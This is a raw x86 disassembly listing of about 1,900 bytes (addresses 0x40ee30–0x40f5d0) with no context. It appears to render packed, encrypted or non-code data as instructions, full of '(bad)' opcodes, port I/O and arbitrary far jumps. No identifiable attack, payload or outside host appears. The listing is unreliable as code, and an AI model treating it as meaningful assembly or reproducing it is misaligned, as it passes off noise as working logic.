  40ee30:	mov    edx,0xd456d038
  40ee35:	cmp    al,0x76
  40ee37:	xor    BYTE PTR [ecx+0x23],dl
  40ee3a:	std    
  40ee3b:	or     esi,DWORD PTR [edi+0x641637dd]
  40ee41:	mov    eax,0x74703a2a
  40ee46:	add    eax,0x1e94eab6
  40ee4b:	sub    DWORD PTR [edx-0x126dc587],ebx
  40ee51:	jns    0x40ee74
  40ee53:	icebp  
  40ee54:	popf   
  40ee55:	push   ecx
  40ee56:	outs   dx,DWORD PTR ds:[esi]
  40ee57:	mov    edi,0xb5245c30
  40ee5c:	fbld   TBYTE PTR [edx+0x16aa1327]
  40ee62:	imul   edx,DWORD PTR [ebx+0x38],0xffffffe5
  40ee66:	or     eax,0x2b85fc9d
  40ee6b:	lea    edi,[esi+0x76]
  40ee6e:	sbb    eax,0xb44cb695
  40ee73:	and    DWORD PTR [esi],esp
  40ee75:	in     al,0xbd
  40ee77:	shl    BYTE PTR [eax+0x36],0xaa
  40ee7b:	sbb    BYTE PTR [edi+0x54],bl
  40ee7e:	call   0xdca39848
  40ee83:	outs   dx,DWORD PTR ds:[esi]
  40ee84:	aad    0x2c
  40ee86:	nop
  40ee87:	mov    gs,ebp
  40ee89:	cmp    esp,DWORD PTR ds:0x41e962c7
  40ee8f:	jae    0x40ef03
  40ee91:	jmp    0x16b6:0x8446bee6
  40ee98:	jg     0x40ee9b
  40ee9a:	lds    eax,FWORD PTR [esi-0x761b8dcf]
  40eea0:	mov    ds:0x25feeb92,al
  40eea5:	ds push es
  40eea7:	test   BYTE PTR [ebx-0x3bf1ce91],cl
  40eead:	sbb    al,0x24
  40eeaf:	aam    0xb2
  40eeb1:	push   ss
  40eeb2:	repnz pop ss
  40eeb4:	jmp    0x5f83:0xfcd496c6
  40eebb:	xor    eax,0x63810371
  40eec0:	sbb    BYTE PTR [ebp-0x76],cl
  40eec3:	int    0xa
  40eec5:	jge    0x40eec7
  40eec7:	(bad)  
  40eec8:	xchg   ebp,eax
  40eec9:	inc    ebx
  40eeca:	loopne 0x40eedd
  40eecc:	pop    esi
  40eecd:	sub    al,0xc1
  40eecf:	adc    BYTE PTR [eax],al
  40eed1:	test   al,0xc2
  40eed3:	(bad)  
  40eed4:	jmp    0xb202:0x88b51bab
  40eedb:	sub    bl,BYTE PTR [ebp-0x66]
  40eede:	std    
  40eedf:	call   0xa282:0x579dc285
  40eee6:	sbb    eax,0xfbb1dc1c
  40eeeb:	dec    esi
  40eeec:	stc    
  40eeed:	dec    esp
  40eeee:	ficomp WORD PTR [ebp+0xe]
  40eef1:	push   esi
  40eef2:	ds rcr cl,0x3c
  40eef6:	dec    ebp
  40eef7:	xchg   ebx,eax
  40eef8:	in     eax,0x12
  40eefa:	test   al,0x6c
  40eefc:	xchg   edi,eax
  40eefd:	es scas al,BYTE PTR es:[edi]
  40eeff:	adc    BYTE PTR [edi+edi*1+0x392109c6],0x17
  40ef07:	jae    0x40ef33
  40ef09:	nop
  40ef0a:	sub    eax,0xe3c7ff28
  40ef0f:	push   ss
  40ef10:	jmp    0x787bc5c8
  40ef15:	push   ebp
  40ef16:	das    
  40ef17:	cwde   
  40ef18:	jae    0x40ef7b
  40ef1a:	arpl   WORD PTR [edi-0x58],cx
  40ef1d:	test   al,0xd8
  40ef1f:	adc    BYTE PTR [esi],0x12
  40ef22:	cmp    DWORD PTR [ebx+0x32],edi
  40ef25:	jae    0x40ef2c
  40ef27:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40ef29:	(bad)  
  40ef2a:	(bad)  
  40ef2b:	shr    esp,1
  40ef2d:	xchg   ebp,eax
  40ef2e:	jae    0x40eeeb
  40ef30:	mov    al,0x8f
  40ef32:	sar    ah,1
  40ef34:	inc    ebp
  40ef35:	into   
  40ef36:	addr16 dec ebx
  40ef38:	cs frstpm(287 only) 
  40ef3b:	mov    ch,0xbd
  40ef3d:	and    eax,0x73fdec7d
  40ef42:	sbb    eax,esp
  40ef44:	jae    0x40ef61
  40ef46:	fstp   QWORD PTR [edx-0x5f6045ea]
  40ef4c:	or     esi,esi
  40ef4e:	dec    esi
  40ef4f:	scas   al,BYTE PTR es:[edi]
  40ef50:	in     al,0x63
  40ef52:	add    eax,0xccd5d3bb
  40ef57:	repnz das 
  40ef59:	or     BYTE PTR [esp+eiz*2],bl
  40ef5c:	and    BYTE PTR [edi],dl
  40ef5e:	jg     0x40ef2c
  40ef60:	int3   
  40ef61:	dec    esi
  40ef62:	push   eax
  40ef63:	and    esp,0x1ed014b9
  40ef69:	enter  0x5d31,0x52
  40ef6d:	pop    eax
  40ef6e:	sub    DWORD PTR [edx-0x6],0x1a244129
  40ef75:	cmp    al,BYTE PTR [esi-0x29]
  40ef78:	jne    0x40ef78
  40ef7a:	outs   dx,DWORD PTR ds:[esi]
  40ef7b:	int3   
  40ef7c:	sub    eax,0xcfb0d26c
  40ef81:	popa   
  40ef82:	ja     0x40ef64
  40ef84:	jmp    0x40ef18
  40ef86:	sbb    cl,BYTE PTR [ebx-0x3f]
  40ef89:	xchg   ecx,eax
  40ef8a:	aam    0xb9
  40ef8c:	jbe    0x40efca
  40ef8e:	enter  0x4419,0x89
  40ef92:	(bad)  
  40ef93:	imul   edi,DWORD PTR [esi+0x57],0xffffffa4
  40ef97:	rol    BYTE PTR [edi-0x10db25ae],cl
  40ef9d:	mov    eax,eax
  40ef9f:	leave  
  40efa0:	lock scas al,BYTE PTR es:[edi]
  40efa2:	jle    0x40ef74
  40efa4:	rcr    DWORD PTR [edx],1
  40efa6:	sar    BYTE PTR [esi-0x6e8851de],cl
  40efac:	repnz mov esi,0x99247ec1
  40efb2:	lahf   
  40efb3:	aaa    
  40efb4:	in     al,dx
  40efb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efb6:	sub    al,dh
  40efb8:	mov    ds:0x1b19f0,eax
  40efbd:	push   ebx
  40efbe:	fdivr  st,st(5)
  40efc0:	xchg   ecx,eax
  40efc1:	sub    cl,BYTE PTR [esi+0x1f]
  40efc4:	xchg   DWORD PTR [ebx-0x34],esi
  40efc7:	test   bh,al
  40efc9:	outs   dx,BYTE PTR ds:[esi]
  40efca:	dec    esp
  40efcb:	retf   0xf649
  40efce:	les    ebx,FWORD PTR [ebx+0x45]
  40efd1:	fs jecxz 0x40efb4
  40efd4:	rcr    bh,cl
  40efd6:	sahf   
  40efd7:	in     eax,dx
  40efd8:	cmp    al,0xf
  40efda:	lods   al,BYTE PTR ds:[esi]
  40efdb:	test   al,0x21
  40efdd:	out    dx,al
  40efde:	xor    BYTE PTR [ebx],al
  40efe0:	cmp    eax,0x594c6221
  40efe5:	xor    al,0xc1
  40efe7:	ficomp WORD PTR [eax+0xd]
  40efea:	mov    al,0xca
  40efec:	mov    eax,0xac92e9ba
  40eff1:	in     al,dx
  40eff2:	inc    esi
  40eff3:	sub    eax,0x909e40c8
  40eff8:	ins    DWORD PTR es:[edi],dx
  40eff9:	push   esp
  40effa:	int3   
  40effb:	outs   dx,DWORD PTR ds:[esi]
  40effc:	rcr    DWORD PTR [esi],1
  40effe:	mov    ds,WORD PTR [edx+0x53]
  40f001:	mov    al,ds:0x3971284c
  40f006:	push   ebp
  40f007:	pop    edx
  40f008:	lods   eax,DWORD PTR gs:[esi]
  40f00a:	push   cs
  40f00b:	sub    BYTE PTR [edi*2+0x779d22da],ah
  40f012:	dec    edx
  40f013:	inc    eax
  40f014:	and    dl,ah
  40f016:	ja     0x40f046
  40f018:	cmp    al,0x81
  40f01a:	jb     0x40f050
  40f01c:	lahf   
  40f01d:	ror    edx,0x2a
  40f020:	icebp  
  40f021:	push   edi
  40f022:	pop    ds
  40f023:	cmp    bl,BYTE PTR [edx]
  40f025:	shl    eax,cl
  40f027:	or     eax,0x70a27a77
  40f02c:	inc    di
  40f02e:	hlt    
  40f02f:	mov    ecx,0x1c03e8fd
  40f034:	bound  esi,QWORD PTR [eax]
  40f036:	pushf  
  40f037:	aam    0xd7
  40f039:	mov    ds:0x46c6e3cf,al
  40f03e:	std    
  40f03f:	xchg   ebx,eax
  40f040:	sbb    al,0x2c
  40f042:	std    
  40f043:	mov    ?,WORD PTR [esi-0x45d58a5]
  40f049:	aas    
  40f04a:	inc    ecx
  40f04b:	ja     0x40f064
  40f04d:	stc    
  40f04e:	es scas al,BYTE PTR es:[edi]
  40f050:	js     0x40eff7
  40f052:	and    DWORD PTR [ebp-0x3],0xe3f584d4
  40f059:	pushf  
  40f05a:	sbb    DWORD PTR [esi-0x1454b3ac],edi
  40f060:	retf   
  40f061:	jl     0x40effb
  40f063:	enter  0x1cb3,0x29
  40f067:	or     DWORD PTR [ecx],0xffffffca
  40f06a:	daa    
  40f06b:	jmp    0x40eff9
  40f06d:	test   ecx,edx
  40f06f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f070:	add    DWORD PTR [edx-0x200adb8d],esi
  40f076:	xlat   BYTE PTR ds:[ebx]
  40f077:	push   esp
  40f078:	mov    gs,WORD PTR [ecx-0x7ddd2102]
  40f07e:	sbb    esi,DWORD PTR [eax+0x15]
  40f081:	stc    
  40f082:	in     eax,0x96
  40f084:	mov    ah,0xe3
  40f086:	or     al,0x1e
  40f088:	adc    BYTE PTR [ecx+0x2bb8cbe9],al
  40f08e:	jp     0x40f05b
  40f090:	(bad)  
  40f091:	fiadd  DWORD PTR [eax+0x46]
  40f094:	lea    esp,[edx+ecx*4-0x4d265aef]
  40f09b:	xor    al,0x5c
  40f09d:	mov    DWORD PTR [esi-0xa],ebx
  40f0a0:	dec    ebx
  40f0a1:	repz pop edi
  40f0a3:	popf   
  40f0a4:	sar    al,0x54
  40f0a7:	pop    eax
  40f0a8:	push   edx
  40f0a9:	pop    ss
  40f0aa:	pop    edx
  40f0ab:	xlat   BYTE PTR ds:[ebx]
  40f0ac:	sub    DWORD PTR ds:0xe7817103,0xd86ad211
  40f0b6:	in     eax,dx
  40f0b7:	sbb    ah,BYTE PTR [ebx]
  40f0b9:	shr    ebp,1
  40f0bb:	(bad)
  40f0be:	inc    esp
  40f0bf:	jo     0x40f0ee
  40f0c1:	fucomp st(1)
  40f0c3:	repnz scas eax,DWORD PTR es:[edi]
  40f0c5:	out    dx,al
  40f0c6:	or     ebx,DWORD PTR [edx]
  40f0c8:	repnz (bad) 
  40f0ca:	pop    ebp
  40f0cb:	dec    ebx
  40f0cc:	mov    eax,ds:0xf1a961bc
  40f0d1:	ins    DWORD PTR es:[edi],dx
  40f0d2:	fwait
  40f0d3:	or     al,BYTE PTR [esi-0x39c51e20]
  40f0d9:	add    eax,0x9a8d521d
  40f0de:	push   ds
  40f0df:	fyl2xp1 
  40f0e1:	iret   
  40f0e2:	and    al,BYTE PTR [ecx+0x68d768c9]
  40f0e8:	scas   al,BYTE PTR es:[edi]
  40f0e9:	bnd jne 0x40f14a
  40f0ec:	push   edi
  40f0ed:	xor    eax,0x3607dd8b
  40f0f2:	push   ds
  40f0f3:	mov    bl,0xb7
  40f0f5:	lahf   
  40f0f6:	xchg   DWORD PTR [ecx-0x54],eax
  40f0f9:	lods   eax,DWORD PTR ds:[esi]
  40f0fa:	push   ss
  40f0fb:	std    
  40f0fc:	fwait
  40f0fd:	fwait
  40f0fe:	loopne 0x40f175
  40f100:	mov    esp,0x827feef2
  40f105:	push   ecx
  40f106:	or     BYTE PTR [ebp+0x7189b303],dl
  40f10c:	enter  0x7f5,0xde
  40f110:	pop    edi
  40f111:	add    al,0x11
  40f113:	jmp    0x5881:0x92ed322f
  40f11a:	xor    dl,bh
  40f11c:	xor    eax,0xc5d428b5
  40f121:	adc    eax,0x7feb3319
  40f126:	xchg   ebx,esp
  40f128:	lds    ebp,FWORD PTR [esi+0x440da317]
  40f12e:	dec    ebx
  40f12f:	push   ecx
  40f130:	mov    edi,0x2b4ad3c7
  40f135:	mov    bh,0xbb
  40f137:	fnsave [ecx+0x3]
  40f13a:	(bad)  
  40f13b:	jl     0x40f129
  40f13d:	imul   eax,DWORD PTR [edx-0x43],0xfffffffb
  40f141:	jp     0x40f0ea
  40f143:	jg     0x40f169
  40f145:	push   ds
  40f146:	rcl    dl,1
  40f148:	les    esi,FWORD PTR [esi]
  40f14a:	nop
  40f14b:	sbb    al,0x16
  40f14d:	cs jmp 0xb1fca183
  40f153:	inc    edi
  40f154:	jle    0x40f10c
  40f156:	dec    ebp
  40f157:	push   ds
  40f158:	shl    DWORD PTR [ecx+eax*4-0x43c6cfd0],0x52
  40f160:	mov    al,ds:0xf0192f32
  40f165:	dec    eax
  40f166:	ja     0x40f1b0
  40f168:	dec    edi
  40f169:	int3   
  40f16a:	iret   
  40f16b:	out    0xa2,al
  40f16d:	cmp    al,0xf7
  40f16f:	mov    al,ds:0xcda8d286
  40f174:	mov    eax,0x994dfb77
  40f179:	dec    esp
  40f17a:	je     0x40f12e
  40f17c:	xchg   ebx,eax
  40f17d:	mov    ds:0xab8e085b,al
  40f182:	sub    esp,DWORD PTR [edi-0x7b]
  40f185:	push   ecx
  40f186:	cmc    
  40f187:	mov    dl,0x43
  40f189:	(bad)  
  40f18a:	push   cs
  40f18b:	(bad)  
  40f18c:	mov    bl,0xd7
  40f18e:	outs   dx,BYTE PTR ds:[esi]
  40f18f:	or     DWORD PTR ds:0xe25c5919,edx
  40f195:	loop   0x40f119
  40f197:	dec    ecx
  40f198:	and    DWORD PTR es:[edx+ebx*4],ebx
  40f19c:	retf   0x70e0
  40f19f:	(bad)  
  40f1a0:	(bad)  
  40f1a1:	jns    0x40f190
  40f1a3:	in     al,0x91
  40f1a5:	test   al,0x2f
  40f1a7:	clc    
  40f1a8:	shl    BYTE PTR [ebx],0xdb
  40f1ab:	add    DWORD PTR [ebx+0x1a],ebp
  40f1ae:	jp     0x40f21e
  40f1b0:	aas    
  40f1b1:	aas    
  40f1b2:	mov    dl,0x38
  40f1b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1b5:	xor    BYTE PTR [esi],bh
  40f1b7:	test   al,al
  40f1b9:	test   eax,0xdaedac1e
  40f1be:	ins    DWORD PTR es:[edi],dx
  40f1bf:	pop    edx
  40f1c0:	shr    BYTE PTR [edx+0x4e572abc],cl
  40f1c6:	push   0xbc23233a
  40f1cb:	lods   eax,DWORD PTR ds:[esi]
  40f1cc:	pop    esp
  40f1cd:	out    0x3e,eax
  40f1cf:	ins    DWORD PTR es:[edi],dx
  40f1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f1d1:	mov    ebp,0x88be6110
  40f1d6:	mov    edx,0xff06eddf
  40f1db:	aas    
  40f1dc:	pushf  
  40f1dd:	imul   ebx,DWORD PTR [ecx+0x57],0xe760eb07
  40f1e4:	in     eax,dx
  40f1e5:	pushf  
  40f1e6:	cmp    eax,0xfdf4aa62
  40f1eb:	push   DWORD PTR cs:[esi+0x47]
  40f1ef:	inc    edi
  40f1f0:	and    al,0x8c
  40f1f2:	mov    ch,0x5d
  40f1f4:	pop    esp
  40f1f5:	add    al,0x30
  40f1f7:	fist   DWORD PTR [ecx]
  40f1f9:	lds    edi,FWORD PTR [edx]
  40f1fb:	xor    eax,0xc372fbfa
  40f200:	jecxz  0x40f1fc
  40f202:	hlt    
  40f203:	mov    dl,0x5b
  40f205:	jg     0x40f211
  40f207:	lea    ebx,[eax]
  40f209:	pop    ebp
  40f20a:	dec    edi
  40f20b:	and    ebp,esp
  40f20d:	rcr    BYTE PTR [ebp+ebp*2+0x3a],0x68
  40f212:	and    al,0x69
  40f214:	in     al,0xc8
  40f216:	push   ss
  40f217:	mov    al,0xc3
  40f21a:	das    
  40f21b:	loop   0x40f225
  40f21d:	xchg   edx,eax
  40f21e:	int    0x8e
  40f220:	lea    ebp,[edx+esi*4-0xe]
  40f224:	fistp  QWORD PTR [ebx-0x57]
  40f227:	neg    BYTE PTR [ebx-0x15]
  40f22a:	lds    esi,FWORD PTR [esi]
  40f22c:	mov    bl,0xd0
  40f22e:	mov    DWORD PTR [edx],esp
  40f230:	test   eax,0xf83da760
  40f235:	jne    0x40f1e9
  40f237:	imul   esp,DWORD PTR [esp+eax*8-0x7b97d3bc],0xc4c337fa
  40f242:	repz jne 0x40f2c3
  40f245:	popa   
  40f246:	test   BYTE PTR [eax+edi*8+0xd],bh
  40f24a:	cmp    DWORD PTR [edi+0x2813d506],esp
  40f250:	inc    ecx
  40f251:	mov    eax,edi
  40f253:	mov    ds:0xe4f4e083,al
  40f258:	cmp    bl,BYTE PTR [eax]
  40f25a:	imul   DWORD PTR [ebx]
  40f25c:	int3   
  40f25d:	iret   
  40f25e:	stos   DWORD PTR es:[edi],eax
  40f25f:	sub    DWORD PTR [edi-0x36],esp
  40f262:	not    BYTE PTR [edx]
  40f264:	loope  0x40f245
  40f266:	and    al,0x42
  40f268:	mov    ds:0x5441c3e,eax
  40f26d:	inc    edx
  40f26e:	adc    al,0x5
  40f270:	sub    BYTE PTR [eax-0x2989b30],cl
  40f276:	in     eax,0x40
  40f278:	(bad)  
  40f279:	int3   
  40f27a:	adc    eax,0x650be9e4
  40f27f:	int3   
  40f280:	(bad)  
  40f281:	js     0x40f214
  40f283:	adc    bl,BYTE PTR [ecx+edx*8+0x4656830b]
  40f28a:	dec    eax
  40f28b:	xchg   edi,eax
  40f28c:	sub    BYTE PTR [ebp+0xd],cl
  40f28f:	sub    eax,0x1c8396f2
  40f294:	mov    edi,0x2fd35b48
  40f299:	xor    eax,0x73ad2fce
  40f29e:	mov    eax,ds:0xf9854858
  40f2a3:	sub    cl,BYTE PTR [edx+esi*2]
  40f2a6:	dec    ebp
  40f2a7:	mov    eax,ds:0xb5991b3b
  40f2ac:	popa   
  40f2ad:	sub    ch,BYTE PTR [ebx+0x3d2483af]
  40f2b3:	cli    
  40f2b4:	ins    DWORD PTR es:[edi],dx
  40f2b5:	pop    edi
  40f2b6:	push   es
  40f2b7:	jg     0x40f2cb
  40f2b9:	inc    ecx
  40f2ba:	jnp    0x40f273
  40f2bc:	adc    DWORD PTR [esi+0x24d13c81],edx
  40f2c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2c3:	call   0xa130:0x9b8773c2
  40f2ca:	push   edi
  40f2cb:	test   DWORD PTR [ebp+0x30],esi
  40f2ce:	xchg   BYTE PTR [ebx],dl
  40f2d0:	call   0xc6430d37
  40f2d5:	inc    edx
  40f2d6:	or     eax,0xc2402e1d
  40f2db:	cld    
  40f2dc:	dec    edx
  40f2dd:	jo     0x40f30f
  40f2df:	mov    edx,0x8da12b2d
  40f2e4:	adc    al,0x57
  40f2e6:	add    BYTE PTR [edi-0x10371e81],ch
  40f2ec:	pop    ecx
  40f2ed:	out    0x5a,eax
  40f2ef:	push   0x69
  40f2f1:	jne    0x40f290
  40f2f3:	inc    esi
  40f2f4:	mov    bl,BYTE PTR [edi]
  40f2f6:	dec    esp
  40f2f7:	stos   BYTE PTR es:[edi],al
  40f2f8:	and    bl,BYTE PTR [esi+eax*4+0x52955a2d]
  40f2ff:	retf   
  40f300:	mov    edi,DWORD PTR [ebp-0x64a8c286]
  40f306:	push   0xffffffa8
  40f308:	data16 jg 0x40f2b7
  40f30b:	jne    0x40f372
  40f30d:	js     0x40f37d
  40f30f:	or     bl,BYTE PTR [edi]
  40f311:	or     al,0x4e
  40f313:	ds ss sahf 
  40f316:	leave  
  40f317:	call   0xd37:0x1d9e6adf
  40f31e:	lds    esp,FWORD PTR [edx-0x40935119]
  40f324:	mov    esi,0x5657c6d6
  40f329:	xchg   esi,eax
  40f32a:	aas    
  40f32b:	nop
  40f32c:	das    
  40f32d:	fdiv   st,st(7)
  40f32f:	adc    BYTE PTR [edx-0x5af28877],bh
  40f335:	ins    DWORD PTR es:[edi],dx
  40f336:	pop    ebp
  40f337:	mov    ebx,0x8d3a3169
  40f33c:	lahf   
  40f33d:	jbe    0x40f331
  40f33f:	(bad)  
  40f340:	stc    
  40f341:	xor    eax,edi
  40f343:	push   edi
  40f345:	in     eax,dx
  40f346:	pop    ebx
  40f347:	aaa    
  40f348:	rcr    DWORD PTR [edi-0x6c],cl
  40f34b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f34c:	xacquire xchg DWORD PTR [edx],ebp
  40f34f:	mov    ds:0x7d8d3223,al
  40f354:	in     al,dx
  40f355:	add    bh,cl
  40f357:	jecxz  0x40f322
  40f359:	xchg   ebx,eax
  40f35a:	std    
  40f35b:	mov    ebp,0x8061275b
  40f360:	pop    ecx
  40f361:	jmp    0x40f32b
  40f363:	out    0x6d,eax
  40f365:	fdivr  QWORD PTR [ebp-0x44bc3dfa]
  40f36b:	out    0x6c,al
  40f36d:	xchg   ecx,eax
  40f36e:	repz pop ecx
  40f370:	add    al,0x8c
  40f372:	ss (bad) 
  40f374:	adc    ebx,DWORD PTR [edx]
  40f376:	out    0xc4,al
  40f378:	push   esi
  40f379:	xor    eax,0x735c3d6d
  40f37e:	lods   al,BYTE PTR ds:[esi]
  40f37f:	iret   
  40f380:	dec    esi
  40f381:	imul   ebx,ebx,0x18c51648
  40f387:	mov    ebp,0x2dc5729
  40f38c:	test   BYTE PTR [ecx],ah
  40f38e:	cmp    edx,DWORD PTR [edx+0x55]
  40f391:	ficom  WORD PTR [eax+0x14]
  40f394:	fsub   QWORD PTR [eax+ebp*2-0x63fc364e]
  40f39b:	scas   al,BYTE PTR es:[edi]
  40f39c:	les    ebx,FWORD PTR [edi+esi*1+0x1a9e535a]
  40f3a3:	jg     0x40f3ba
  40f3a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f3a6:	cmp    eax,DWORD PTR [edi+0x3a]
  40f3a9:	cmp    eax,0x945f1b3c
  40f3ae:	cmp    ah,BYTE PTR [edx+0x5d04e46b]
  40f3b4:	jmp    0x40f424
  40f3b6:	aas    
  40f3b7:	mov    dl,BYTE PTR [ecx-0x13]
  40f3ba:	ja     0x40f3ad
  40f3bc:	daa    
  40f3bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3be:	data16 jp 0x40f432
  40f3c1:	lds    esi,FWORD PTR [esi]
  40f3c3:	int3   
  40f3c4:	sbb    eax,DWORD PTR [ebx-0xd8b175a]
  40f3ca:	push   0xceaaaaba
  40f3cf:	push   ds
  40f3d0:	mov    es,esp
  40f3d2:	pop    eax
  40f3d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f3d4:	mov    ?,WORD PTR [esi+ebx*1]
  40f3d7:	sub    eax,DWORD PTR [ecx]
  40f3d9:	mov    ah,0x99
  40f3db:	aad    0x2
  40f3dd:	sub    edx,esi
  40f3df:	mov    bl,0x4e
  40f3e1:	sahf   
  40f3e2:	mov    cl,0x3e
  40f3e4:	jnp    0x40f367
  40f3e6:	in     al,dx
  40f3e7:	cmp    eax,0x3f0f1ffe
  40f3ec:	and    BYTE PTR [ebx+0x44],al
  40f3ef:	adc    BYTE PTR [ecx+0x5cdf45b1],bh
  40f3f5:	jb     0x40f429
  40f3f7:	push   ecx
  40f3f8:	sub    DWORD PTR [edx-0x2e],esi
  40f3fb:	cwde   
  40f3fc:	xor    al,0x3a
  40f3fe:	xlat   BYTE PTR ds:[ebx]
  40f3ff:	xor    DWORD PTR [esi+0x4f89c3b8],ecx
  40f405:	mov    ebx,0x982a976
  40f40a:	test   BYTE PTR [edi-0x6d],dl
  40f40d:	cdq    
  40f40e:	in     al,dx
  40f40f:	out    dx,al
  40f410:	idiv   BYTE PTR [ebp+0xd3552c0]
  40f416:	sbb    DWORD PTR [ebx],0xffffffa5
  40f419:	pop    ecx
  40f41a:	add    BYTE PTR [ebx+0x14],cl
  40f41d:	lods   al,BYTE PTR ds:[esi]
  40f41e:	jns    0x40f3c0
  40f420:	or     DWORD PTR [edi+0x129a70c7],ebx
  40f426:	repz das 
  40f428:	jbe    0x40f3ac
  40f42a:	cmp    al,0x75
  40f42c:	inc    BYTE PTR ds:0x3fbe69c8
  40f432:	mov    WORD PTR ds:0x91f6ae0,fs
  40f438:	dec    ebx
  40f439:	call   0xae27:0x4907d4b0
  40f440:	stos   DWORD PTR es:[edi],eax
  40f441:	test   eax,0x2494fa85
  40f446:	add    eax,0x63f4c3
  40f44b:	sahf   
  40f44c:	jge    0x40f3d5
  40f44e:	call   0x173e6989
  40f453:	retf   
  40f454:	ja     0x40f400
  40f456:	pop    ecx
  40f457:	push   esp
  40f458:	lahf   
  40f459:	xor    edi,DWORD PTR [ecx-0x28a97def]
  40f45f:	iret   
  40f460:	stos   BYTE PTR es:[edi],al
  40f461:	push   0x3cfd481a
  40f466:	xchg   esi,eax
  40f467:	ret    
  40f468:	jb     0x40f443
  40f46a:	repz call 0x78cc:0x7c526868
  40f472:	xor    edi,DWORD PTR [eax-0x22162c06]
  40f478:	mov    ecx,0x5ec2adfa
  40f47d:	jbe    0x40f4c8
  40f47f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f480:	je     0x40f4ba
  40f482:	fstp   TBYTE PTR [edx]
  40f484:	mov    al,ds:0xddb6fd26
  40f489:	jg     0x40f455
  40f48b:	stc    
  40f48c:	push   esi
  40f48d:	pop    ebp
  40f48e:	mov    edi,0x34d70e30
  40f493:	push   ecx
  40f494:	ror    DWORD PTR cs:[ebx],1
  40f497:	lea    eax,[edi-0x68223bdc]
  40f49d:	xchg   eax,ebp
  40f49f:	and    eax,0x5e924ed
  40f4a4:	xor    eax,0xb148ea7a
  40f4a9:	jb     0x40f46e
  40f4ab:	jmp    FWORD PTR [ecx]
  40f4ad:	cwde   
  40f4ae:	ds and eax,0x9b62087a
  40f4b4:	sbb    al,0x94
  40f4b6:	cmp    esp,DWORD PTR [edx]
  40f4b8:	loope  0x40f4c8
  40f4ba:	aas    
  40f4bb:	jle    0x40f448
  40f4bd:	aad    0x81
  40f4bf:	push   esi
  40f4c0:	rcl    DWORD PTR [edx+0x43],cl
  40f4c3:	jecxz  0x40f47d
  40f4c5:	jnp    0x40f46b
  40f4c7:	xchg   esi,eax
  40f4c8:	dec    edi
  40f4c9:	jmp    0x741c:0x9181b0b2
  40f4d0:	ds nop
  40f4d2:	fnstsw WORD PTR [edx]
  40f4d4:	or     al,0x42
  40f4d6:	cwde   
  40f4d7:	cmp    eax,eax
  40f4d9:	rcr    DWORD PTR [ebx+0x5b36fccc],0xaf
  40f4e0:	mov    cl,0x23
  40f4e2:	mov    ecx,0xd324828d
  40f4e7:	xor    BYTE PTR [ecx-0x9],ah
  40f4ea:	sbb    dl,0x9a
  40f4ed:	nop
  40f4ee:	mov    bl,0x67
  40f4f0:	nop
  40f4f1:	sbb    ebx,DWORD PTR [ebp-0x272678e2]
  40f4f7:	sti    
  40f4f8:	fs and al,0x35
  40f4fb:	adc    ch,cl
  40f4fd:	lds    ecx,FWORD PTR [edi+0x575af72f]
  40f503:	and    ebp,DWORD PTR [edx+0x61644538]
  40f509:	icebp  
  40f50a:	aam    0x5a
  40f50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f50d:	pop    esi
  40f50e:	dec    esp
  40f50f:	(bad)  
  40f510:	call   0xd154:0xf500a38c
  40f517:	dec    esp
  40f518:	and    DWORD PTR [edi+0x52],0x3fe0b38c
  40f51f:	pop    ebp
  40f520:	loop   0x40f57d
  40f522:	and    al,0xe7
  40f524:	inc    edx
  40f525:	dec    esi
  40f526:	fidiv  WORD PTR [bp-0x25c0]
  40f52b:	jb     0x40f505
  40f52d:	dec    esi
  40f52e:	mov    ecx,0x12ded48f
  40f533:	inc    ecx
  40f534:	jge    0x40f574
  40f536:	fs clc 
  40f538:	out    0x15,eax
  40f53a:	sub    cl,cl
  40f53c:	inc    ebp
  40f53d:	sbb    BYTE PTR [esi-0x75a06a97],ch
  40f543:	bound  edx,QWORD PTR [ebx]
  40f545:	sbb    eax,0xcd6fbe72
  40f54a:	stc    
  40f54b:	imul   edx,esi,0x5dfb07b3
  40f551:	jle    0x40f5c1
  40f553:	inc    eax
  40f554:	test   BYTE PTR [ebx],al
  40f556:	xor    edi,DWORD PTR [edi+0x3f6ba62]
  40f55c:	jb     0x40f502
  40f55e:	dec    esi
  40f55f:	dec    ecx
  40f560:	push   es
  40f561:	push   esi
  40f562:	jmp    0xeffb1cd2
  40f567:	fld    QWORD PTR [edi+0x32b9540]
  40f56d:	mov    eax,ds:0x44a11909
  40f572:	(bad)  [edx]
  40f574:	leave  
  40f575:	xor    al,0x1d
  40f577:	cwde   
  40f578:	mov    DWORD PTR [edi],edi
  40f57a:	inc    edi
  40f57b:	(bad)  
  40f57c:	jl     0x40f521
  40f57e:	pop    esp
  40f57f:	add    eax,0xc42855cc
  40f584:	dec    ebx
  40f585:	push   ds
  40f586:	je     0x40f528
  40f588:	sbb    eax,0x4ceadafa
  40f58d:	enter  0x9bbc,0xce
  40f591:	or     eax,0x4eb68ab6
  40f596:	stos   BYTE PTR es:[edi],al
  40f597:	imul   eax,DWORD PTR [edx+eiz*4+0x1bdbd8c0],0xdcffa9f
  40f5a2:	cmp    DWORD PTR [eax],0xdd012b51
  40f5a8:	add    eax,0xec1120f9
  40f5ad:	stos   BYTE PTR es:[edi],al
  40f5ae:	out    0x40,al
  40f5b0:	or     al,BYTE PTR [edx+0x2e0bd067]
  40f5b6:	jmp    0x40f53f
  40f5b8:	cld    
  40f5b9:	ss popf 
  40f5bb:	loope  0x40f588
  40f5bd:	or     BYTE PTR [esi],bh
  40f5bf:	mov    cl,0xfc
  40f5c1:	adc    al,0x93
  40f5c3:	bound  edi,QWORD PTR [esi]
  40f5c5:	loope  0x40f569
  40f5c7:	fadd   QWORD PTR [ecx-0x1440ffe]
  40f5cd:	xor    al,0x45
  40f5cf:	dec    eax
  40f5d0:	pop    ecx
